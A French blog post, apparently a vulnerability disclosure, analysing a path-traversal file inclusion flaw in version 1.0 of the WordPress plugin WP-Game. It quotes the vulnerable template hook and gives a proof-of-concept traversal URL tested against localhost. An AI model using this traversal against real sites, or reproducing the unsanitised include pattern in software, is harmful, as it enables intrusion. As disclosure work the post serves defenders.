---
title: "Faille d'inclusion PHP dans le plugin Wordpress WP-Game"
tags: [vulnérabilité]
---

## Présentation du plugin

Le plugin Wordpress [WP-Game](https://wordpress.org/plugins/wp-game/) (slug: `wp-game`) se présente de cette façon :

> This isn’t plugin for website game. This plugin include opensource html5 games library for user visit website. This is mini game help user free stress after tired working times.
  
La version testée est la 1.0 qui date d'il y a 9 ans.

## La vulnérabilité

Dans le script `index.php` le plugin définit un hook pour indiquer à Wordpress de charger un fichier de template spécifique basé sur un paramètre d'URL nommé `g` :

```php
//new template                                                                                                         
add_filter( 'page_template', 'wp_game_page_template' );                                                                
function wp_game_page_template( $page_template )                                                                       
{                                                                                                                      
    $the_page_id = get_option( 'wp_game_plugin_page_id' );                                                             
    if ( is_page( $the_page_id ) ) {                                                                                   
        //$page_template = plugin_dir_path( __FILE__ ).'templates/template-custom.php';                                
        $param = $_SERVER['REQUEST_URI'];                                                                              
        $param = str_replace( '/wp-game/?g=', '', $param );                                                            
        $param = urldecode( $param );                                                                                  
        $page_template = plugin_dir_path( __FILE__ ).'games/'.$param.'/index.php';                                     
    }                                                                                                                  
    return $page_template;                                                                                             
}
```

La façon dont le script récupère la variable via la variable `REQUEST_URI` est assez étrange.

Le script semble tenter d'obtenir la valeur du paramètre `g` mais il le fait uniquement en retirant `/wp-game/?g=` du chemin courant.

Dans tous les cas, on voit que le paramètre `g` sert à créer un path qui a le préfixe `games/` et le suffixe `/index.php`.

Le fait que le path soit hooké sans vérification va provoquer son inclusion par Wordpress dans le fichier `wp-includes/template-loader.php` :

```php
    /**                                                                                                                
     * Filters the path of the current template before including it.                                                   
     *                                                                                                                 
     * @since 3.0.0                                                                                                    
     *                                                                                                                 
     * @param string $template The path of the template to include.                                                    
     */                                                                                                                
    $template = apply_filters( 'template_include', $template );                                                        
    if ( $template ) {                                                                                                 
        include $template;                                                                                             
    } elseif ( current_user_can( 'switch_themes' ) ) {                                                                 
        $theme = wp_get_theme();                                                                                       
        if ( $theme->errors() ) {                                                                                      
            wp_die( $theme->errors() );                                                                                
        }                                                                                                              
    }
```

La vulnérabilité n'est déclenchée que si on appelle la page du Wordpress spécifique au plugin (vous devriez voir un lien `WP-Game` en haut de la page d'index).

Lors de mon test, l'URL était `http://localhost:8000/?page_id=8`.

Son simple chargement provoquait un message dans le fichier de log :

```
PHP Warning:  include(): Failed opening '/var/www/html/wp-content/plugins/wp-game/games//?page_id=8/index.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/wp-includes/template-loader.php on line 106
```

Le plugin dispose de différents jeux ayant chacun un dossier et une page d'index :

```
wp-content/plugins/wp-game/games/Arcade/Crappy_Bird/index.php
wp-content/plugins/wp-game/games/Arcade/Flying_Dog/index.php
wp-content/plugins/wp-game/games/Boardgame/2048/index.php
wp-content/plugins/wp-game/games/Puzzle/Canvas_Tetris/index.php
wp-content/plugins/wp-game/games/Puzzle/Hextris/index.php
wp-content/plugins/wp-game/games/Puzzle/Pacman/index.php
```

Pour prouver qu'il est possible de remonter l'arborescence avec la vulnérabilité, on va charger la page d'index pour Pacman :

```
http://localhost:8000/?page_id=8/../../../../../../../../var/www/html/wp-content/plugins/wp-game/games/Puzzle/Pacman
```

On obtient bien le fichier attendu :

```html
<!DOCTYPE html>
<html>
  <head>
  	<base href="http://localhost:8000/wp-content/plugins/wp-game/games/Puzzle/Pacman/">
    <meta charset="utf-8" />
    <title>HTML5 Pacman</title>
--- snip ---
```

La vulnérabilité est bien présente, mais requiert qu'on puisse placer un fichier `index.php` à un endroit accessible
pour l'inclusion (ça peut être n'importe où ou uniquement sous la racine web selon la configuration du serveur).
